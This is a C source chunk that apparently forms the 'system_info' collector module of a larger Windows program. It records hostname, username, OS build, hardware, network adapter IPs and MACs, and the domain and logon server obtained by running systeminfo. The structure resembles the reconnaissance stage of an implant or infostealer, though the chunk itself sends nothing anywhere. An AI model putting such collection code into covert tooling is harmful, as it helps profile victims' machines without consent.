// chunk: collectors/system_info
// depends: core/emit_buffer, core/run_cmd
// provides: collect_system_info
// headers: shlobj.h, iphlpapi.h
// libs: iphlpapi

#ifndef CHUNK_SYSTEM_INFO
#define CHUNK_SYSTEM_INFO

#include <shlobj.h>
#include <iphlpapi.h>

static void collect_system_info(void) {
    emitf("=== SYSTEM INFO ===\r\n");

    char hostname[256] = {0};
    DWORD hn = sizeof(hostname);
    if (GetComputerNameA(hostname, &hn)) emitf("Hostname: %s\r\n", hostname);

    char user[256] = {0};
    DWORD un = sizeof(user);
    if (GetUserNameA(user, &un)) emitf("Username: %s\r\n", user);

    OSVERSIONINFOA ov;
    ZeroMemory(&ov, sizeof(ov));
    ov.dwOSVersionInfoSize = sizeof(ov);
    GetVersionExA(&ov);
    emitf("OS: Windows %lu.%lu Build %lu\r\n", ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    emitf("Arch: %s  CPUs: %lu\r\n",
          si.wProcessorArchitecture == 9 ? "x64" :
          si.wProcessorArchitecture == 12 ? "ARM64" : "x86",
          si.dwNumberOfProcessors);

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms))
        emitf("RAM: %llu MB\r\n", ms.ullTotalPhys / (1024 * 1024));

    ULONG al = 0;
    GetAdaptersInfo(NULL, &al);
    if (al > 0) {
        PIP_ADAPTER_INFO ai = (PIP_ADAPTER_INFO)malloc(al);
        if (ai && GetAdaptersInfo(ai, &al) == NO_ERROR) {
            for (PIP_ADAPTER_INFO p = ai; p; p = p->Next)
                emitf("NIC: %s  IP: %s  MAC: %02X:%02X:%02X:%02X:%02X:%02X\r\n",
                      p->Description, p->IpAddressList.IpAddress.String,
                      p->Address[0], p->Address[1], p->Address[2],
                      p->Address[3], p->Address[4], p->Address[5]);
        }
        free(ai);
    }

    char cmd_out[4096] = {0};
    DWORD cmd_len = 0;
    run_cmd("cmd /c systeminfo | findstr /B /C:\"Domain\" /C:\"Logon Server\"",
            cmd_out, sizeof(cmd_out), &cmd_len);
    if (cmd_len > 0) emitf("%s", cmd_out);

    emitf("\r\n");
}

#endif
